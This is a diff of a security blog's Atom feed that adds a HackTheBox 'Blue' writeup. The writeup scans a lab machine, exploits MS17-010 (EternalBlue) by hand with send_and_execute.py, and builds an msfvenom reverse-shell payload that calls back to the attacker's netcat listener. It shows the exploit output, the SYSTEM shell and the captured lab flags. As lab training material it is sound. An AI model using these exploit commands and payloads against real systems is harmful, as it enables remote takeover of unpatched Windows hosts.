@@ -1,4 +1,252 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/atom.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-12-09T16:12:43+05:30</updated><id>http://localhost:4000/atom.xml</id><title type="html">b4bygroot</title><subtitle>Ramblings, Facepalms and Writeups from my InfoSec Journey</subtitle><author><name>b4bygroot</name></author><entry><title type="html">Netmon Machine Writeup- HackTheBox</title><link href="http://localhost:4000/2020/12/08/HTB_Netmon-Writeup/" rel="alternate" type="text/html" title="Netmon Machine Writeup- HackTheBox" /><published>2020-12-08T05:00:00+05:30</published><updated>2020-12-08T05:00:00+05:30</updated><id>http://localhost:4000/2020/12/08/HTB_Netmon-Writeup</id><content type="html" xml:base="http://localhost:4000/2020/12/08/HTB_Netmon-Writeup/">&lt;p&gt;&lt;img src=&quot;/assets/images/Netmon/info.png&quot; alt=&quot;Info&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/atom.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-12-09T23:45:37+05:30</updated><id>http://localhost:4000/atom.xml</id><title type="html">b4bygroot</title><subtitle>Ramblings, Facepalms and Writeups from my InfoSec Journey</subtitle><author><name>b4bygroot</name></author><entry><title type="html">Blue Machine Writeup- HackTheBox</title><link href="http://localhost:4000/2020/12/09/HTB_Blue_Writeup/" rel="alternate" type="text/html" title="Blue Machine Writeup- HackTheBox" /><published>2020-12-09T16:00:00+05:30</published><updated>2020-12-09T16:00:00+05:30</updated><id>http://localhost:4000/2020/12/09/HTB_Blue_Writeup</id><content type="html" xml:base="http://localhost:4000/2020/12/09/HTB_Blue_Writeup/">&lt;p&gt;&lt;img src=&quot;/assets/images/Blue/info.png&quot; alt=&quot;Info&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;methodology&quot;&gt;Methodology&lt;/h1&gt;
+&lt;ol&gt;
+  &lt;li&gt;Open Ports Enumeration&lt;/li&gt;
+  &lt;li&gt;SMB Service Enumeration&lt;/li&gt;
+  &lt;li&gt;MS17-010 vulnerability identified&lt;/li&gt;
+  &lt;li&gt;SYSTEM shell gained through manual exploit&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h1 id=&quot;lessons-learned&quot;&gt;Lessons Learned&lt;/h1&gt;
+&lt;ol&gt;
+  &lt;li&gt;EternalBlue exploit&lt;/li&gt;
+  &lt;li&gt;Manual exploitation of MS17-010&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h1 id=&quot;open-ports-enumeration&quot;&gt;Open Ports Enumeration&lt;/h1&gt;
+&lt;p&gt;The open ports enumeration through targetRecon&lt;sup id=&quot;fnref:fn1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:fn1&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;, had identified three open ports namely, &lt;strong&gt;MSRPC&lt;/strong&gt; (135),
+&lt;strong&gt;NETBIOS-SSN&lt;/strong&gt; (139) and &lt;strong&gt;MICROSOFT-DS&lt;/strong&gt; (445). The results of the scan are given below.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[b4bygroot☮arcolinux]-(~/HTB/Tracks/Beginner/Blue)
+└&amp;gt; targetRecon 10.10.10.40
+[+] Open Ports Scan
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+		135     msrpc
+		139     netbios-ssn
+		445     microsoft-ds
+[+] Scripts Scan
+				 nmap -sV -A --script=default,vuln -p 135 10.10.10.40
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-09 16:50 IST
+Nmap scan report for 10.10.10.40 (10.10.10.40)
+Host is up (0.21s latency).
+
+PORT    STATE SERVICE VERSION
+135/tcp open  msrpc   Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 22.21 seconds
+
+				 nmap -sV -A --script=default,vuln -p 139 10.10.10.40
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-09 16:50 IST
+Nmap scan report for 10.10.10.40 (10.10.10.40)
+Host is up (0.20s latency).
+
+PORT    STATE SERVICE     VERSION
+139/tcp open  netbios-ssn Microsoft Windows netbios-ssn
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_samba-vuln-cve-2012-1182: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
+|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
+|_smb2-time: ERROR: Script execution failed (use -d to debug)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 56.36 seconds
+
+				 nmap -sV -A --script=default,vuln -p 445 10.10.10.40
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-09 16:51 IST
+Nmap scan report for 10.10.10.40 (10.10.10.40)
+Host is up (0.20s latency).
+
+PORT    STATE SERVICE      VERSION
+445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 8m10s, deviation: 4s, median: 8m07s
+| smb-os-discovery: 
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: haris-PC
+|   NetBIOS computer name: HARIS-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2020-12-09T11:30:26+00:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-12-09T11:30:24
+|_  start_date: 2020-12-09T11:21:10
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 48.89 seconds
+
+[+] Summary 
+135     msrpc   Microsoft Windows RPC N/A
+				No vuln found
+139     netbios-ssn     Microsoft Windows netbios-ssn N/A
+				No vuln found
+445     microsoft-ds    Windows 7 Professional 7601 Service Pack 1 microsoft-ds N/A
+Vulnerabilities
+['smb-vuln-ms17-010']
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;smb-service-enumeration&quot;&gt;SMB Service Enumeration&lt;/h1&gt;
+&lt;p&gt;As seen from the results on the previous section, the SMB service on the target is vulnerable to 
+&lt;strong&gt;EternalBlue (MS17-010)&lt;/strong&gt;. There is a well written, functioning module on &lt;em&gt;metasploit&lt;/em&gt; that could work. Since the 
+focus is on owning the target without metasploit, &lt;em&gt;Google-Fu&lt;/em&gt; on manual exploitation methods were carried out.&lt;/p&gt;
+
+&lt;h1 id=&quot;foothold&quot;&gt;Foothold&lt;/h1&gt;
+&lt;p&gt;Google search had listed numerous good resources on how to exploit EternalBlue manually. An interesting article from the 
+lot, &lt;strong&gt;Exploiting MS17-010 without Metasploit (Win XP SP3)&lt;/strong&gt;&lt;sup id=&quot;fnref:fn2&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:fn2&quot; class=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;, was chosen for this target. It involves using 
+&lt;strong&gt;send_and_execute.py&lt;/strong&gt;&lt;sup id=&quot;fnref:fn3&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:fn3&quot; class=&quot;footnote&quot;&gt;3&lt;/a&gt;&lt;/sup&gt; with its dependencies &lt;strong&gt;Impacket&lt;/strong&gt;&lt;sup id=&quot;fnref:fn4&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:fn4&quot; class=&quot;footnote&quot;&gt;4&lt;/a&gt;&lt;/sup&gt; and &lt;strong&gt;mysmb&lt;/strong&gt;&lt;sup id=&quot;fnref:fn5&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:fn5&quot; class=&quot;footnote&quot;&gt;5&lt;/a&gt;&lt;/sup&gt; installed.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Note: While, impacket can be installed directly through &lt;em&gt;pip&lt;/em&gt;, &lt;em&gt;mysmb&lt;/em&gt; had to be downloaded manually. There are
+numerous mysmb options available on GitHub, one such instance used to exploit the machine is listed on &lt;sup id=&quot;fnref:fn5:1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:fn5&quot; class=&quot;footnote&quot;&gt;5&lt;/a&gt;&lt;/sup&gt;.
+The exploits from &lt;strong&gt;Exploit-DB&lt;/strong&gt; would also work, but need some similar customization as send_and_execute.py&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;After downloading send_and_execute.py and installing necessary dependencies, the exploit was browsed through to 
+understand the process. The exploit works by uploading a user-specified &lt;strong&gt;payload&lt;/strong&gt; onto the target using &lt;em&gt;PIPE&lt;/em&gt; and
+executing it. A payload was then generated using &lt;em&gt;msfvenom&lt;/em&gt; through the command, 
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.7 LPORT=9095 EXITFUNC=thread -f exe -a x86 --platform windows -o ms17-010.exe&lt;/code&gt;.
+With the payload generated, and a netcat listener on port 9095 of the attacking host, the script was executed as
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python2.7 send_and_execute.py 10.10.10.40 ms17-010.exe&lt;/code&gt;, resulting in a failed attempt with the message
+&lt;em&gt;“Not found accessible named pipe”&lt;/em&gt;. After researching further, trying the exploit again with a different username
+seemed a reasonable option. The &lt;em&gt;USERNAME&lt;/em&gt; on the python script was changed to &lt;strong&gt;guest&lt;/strong&gt; as shown in the section below.&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;USERNAME&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'guest'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;PASSWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;The script was executed again after initiating a netcat listener on the attacking host. This time the exploit worked,
+resulting in a reverse shell from the target and the same is shown on the section given below.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[-----TERMINAL-1-----]
+Beginner/Blue [ python2.7 send_and_execute.py 10.10.10.40 ms17-010.exe                     ] 8:01 PM
+Trying to connect to 10.10.10.40:445
+Target OS: Windows 7 Professional 7601 Service Pack 1
+Using named pipe: browser
+Target is 64 bit
+Got frag size: 0x10
+GROOM_POOL_SIZE: 0x5030
+BRIDE_TRANS_SIZE: 0xfa0
+CONNECTION: 0xfffffa800482c020
+SESSION: 0xfffff8a001885060
+FLINK: 0xfffff8a00187f048
+InParam: 0xfffff8a0019a215c
+MID: 0x1302
+unexpected alignment, diff: 0x-123fb8
+leak failed... try again
+CONNECTION: 0xfffffa800482c020
+SESSION: 0xfffff8a001885060
+FLINK: 0xfffff8a0019b4088
+InParam: 0xfffff8a0019ae15c
+MID: 0x1303
+success controlling groom transaction
+modify trans1 struct for arbitrary read/write
+make this SMB session to be SYSTEM
+overwriting session security context
+Sending file 2CM2VQ.exe...
+Opening SVCManager on 10.10.10.40.....
+Creating service vWCH.....
+Starting service vWCH.....
+The NETBIOS connection with the remote host timed out.
+Removing service vWCH.....
+ServiceExec Error on: 10.10.10.40
+nca_s_proto_error
+Done
+
+[-----TERMINAL-2-----]
+➜  Blue  nc -nvlp 9095                                         
+Connection from 10.10.10.40:49158
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32&amp;gt;cd C:\Users\Administrator\Desktop
+cd C:\Users\Administrator\Desktop
+
+C:\Users\Administrator\Desktop&amp;gt;type root.txt
+type root.txt
+ff548eb71e920ff6c08843ce9df4e717
+C:\Users\Administrator\Desktop&amp;gt;cd C:\Users
+cd C:\Users
+
+C:\Users&amp;gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A0EF-1911
+
+ Directory of C:\Users
+
+21/07/2017  06:56    &amp;lt;DIR&amp;gt;          .
+21/07/2017  06:56    &amp;lt;DIR&amp;gt;          ..
+21/07/2017  06:56    &amp;lt;DIR&amp;gt;          Administrator
+14/07/2017  13:45    &amp;lt;DIR&amp;gt;          haris
+12/04/2011  07:51    &amp;lt;DIR&amp;gt;          Public
+			   0 File(s)              0 bytes
+			   5 Dir(s)  15,888,822,272 bytes free
+
+C:\Users&amp;gt;cd haris\Desktop 
+cd haris\Desktop
+
+C:\Users\haris\Desktop&amp;gt;type user.txt
+type user.txt
+4c546aea7dbee75cbd71de245c8deea9
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/Blue/shell.png&quot; alt=&quot;SYSTEM Shell&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;system-owned&quot;&gt;System Owned&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/Blue/systemown.svg&quot; alt=&quot;System Owned&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;resources&quot;&gt;Resources&lt;/h1&gt;
+&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
+  &lt;ol&gt;
+    &lt;li id=&quot;fn:fn1&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://github.com/b4bygroot/TargetRecon&quot;&gt;targetRecon&lt;/a&gt; &lt;a href=&quot;#fnref:fn1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:fn2&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/&quot;&gt;Exploiting MS17-010 without Metasploit (Win XP SP3)&lt;/a&gt; &lt;a href=&quot;#fnref:fn2&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:fn3&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py&quot;&gt;send_and_execute.py&lt;/a&gt; &lt;a href=&quot;#fnref:fn3&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:fn4&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;Impacket can be installed through &lt;em&gt;pip install impacket&lt;/em&gt; &lt;a href=&quot;#fnref:fn4&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:fn5&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://github.com/worawit/MS17-010/blob/master/mysmb.py&quot;&gt;mysmb.py&lt;/a&gt; &lt;a href=&quot;#fnref:fn5&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt; &lt;a href=&quot;#fnref:fn5:1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;sup&gt;2&lt;/sup&gt;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+  &lt;/ol&gt;
+&lt;/div&gt;</content><author><name>b4bygroot</name></author><category term="HTB" /><category term="Writeup" /><category term="Machine" /><category term="Windows" /><category term="EternalBlue" /><category term="MS17-010" /><category term="without metasploit" /><summary type="html">A retired windows box from HackTheBox, vulnerable to EternalBlue (MS17-010), exploited manually and gained SYSTEM access.</summary></entry><entry><title type="html">Netmon Machine Writeup- HackTheBox</title><link href="http://localhost:4000/2020/12/08/HTB_Netmon-Writeup/" rel="alternate" type="text/html" title="Netmon Machine Writeup- HackTheBox" /><published>2020-12-08T05:00:00+05:30</published><updated>2020-12-08T05:00:00+05:30</updated><id>http://localhost:4000/2020/12/08/HTB_Netmon-Writeup</id><content type="html" xml:base="http://localhost:4000/2020/12/08/HTB_Netmon-Writeup/">&lt;p&gt;&lt;img src=&quot;/assets/images/Netmon/info.png&quot; alt=&quot;Info&quot; /&gt;&lt;/p&gt;
 
 &lt;h1 id=&quot;methodology&quot;&gt;Methodology&lt;/h1&gt;
 &lt;ol&gt;
@@ -9,6 +257,13 @@
   &lt;li&gt;Authenticated RCE identified&lt;/li&gt;
   &lt;li&gt;New SYSTEM user added&lt;/li&gt;
   &lt;li&gt;SYSTEM shell gained&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h1 id=&quot;lessons-learned&quot;&gt;Lessons Learned&lt;/h1&gt;
+&lt;ol&gt;
+  &lt;li&gt;Anonymous FTP login&lt;/li&gt;
+  &lt;li&gt;Enumerating sensitive files through FTP&lt;/li&gt;
+  &lt;li&gt;Authenticated RCE on PRTG Network Monitor&lt;/li&gt;
 &lt;/ol&gt;
 
 &lt;h1 id=&quot;open-ports-enumeration&quot;&gt;Open Ports Enumeration&lt;/h1&gt;
@@ -859,7 +1114,7 @@ C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&qu
       &lt;p&gt;&lt;a href=&quot;https://www.codewatch.org/blog/?p=453&quot;&gt;PRTG &amp;lt; 18.2.39 Command Injection Vulnerability&lt;/a&gt; &lt;a href=&quot;#fnref:fn2&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
     &lt;/li&gt;
   &lt;/ol&gt;
-&lt;/div&gt;</content><author><name>b4bygroot</name></author><category term="HTB" /><category term="Writeup" /><category term="Machine" /><category term="Windows" /><category term="Anonymous FTP login" /><category term="PRTG Network Monitor" /><category term="RCE" /><summary type="html">A retired windows box from HackTheBox, gained foothold by abusing anonymous FTP login, and then elevated privileges through authenticated RCE exploit on PRTG Network Monitor.</summary></entry><entry><title type="html">Jerry Machine Writeup- HackTheBox</title><link href="http://localhost:4000/2020/12/03/HTB_Jerry_Writeup/" rel="alternate" type="text/html" title="Jerry Machine Writeup- HackTheBox" /><published>2020-12-03T16:00:00+05:30</published><updated>2020-12-03T16:00:00+05:30</updated><id>http://localhost:4000/2020/12/03/HTB_Jerry_Writeup</id><content type="html" xml:base="http://localhost:4000/2020/12/03/HTB_Jerry_Writeup/">&lt;p&gt;&lt;img src=&quot;/assets/images/Jerry/info.png&quot; alt=&quot;Info&quot; /&gt;&lt;/p&gt;
+&lt;/div&gt;</content><author><name>b4bygroot</name></author><category term="HTB" /><category term="Writeup" /><category term="Machine" /><category term="Windows" /><category term="Anonymous FTP login" /><category term="PRTG Network Monitor" /><category term="RCE" /><category term="without metasploit" /><summary type="html">A retired windows box from HackTheBox, gained foothold by abusing anonymous FTP login, and then elevated privileges through authenticated RCE exploit on PRTG Network Monitor.</summary></entry><entry><title type="html">Jerry Machine Writeup- HackTheBox</title><link href="http://localhost:4000/2020/12/03/HTB_Jerry_Writeup/" rel="alternate" type="text/html" title="Jerry Machine Writeup- HackTheBox" /><published>2020-12-03T16:00:00+05:30</published><updated>2020-12-03T16:00:00+05:30</updated><id>http://localhost:4000/2020/12/03/HTB_Jerry_Writeup</id><content type="html" xml:base="http://localhost:4000/2020/12/03/HTB_Jerry_Writeup/">&lt;p&gt;&lt;img src=&quot;/assets/images/Jerry/info.png&quot; alt=&quot;Info&quot; /&gt;&lt;/p&gt;
 
 &lt;h1 id=&quot;methodology&quot;&gt;Methodology&lt;/h1&gt;
 &lt;ol&gt;
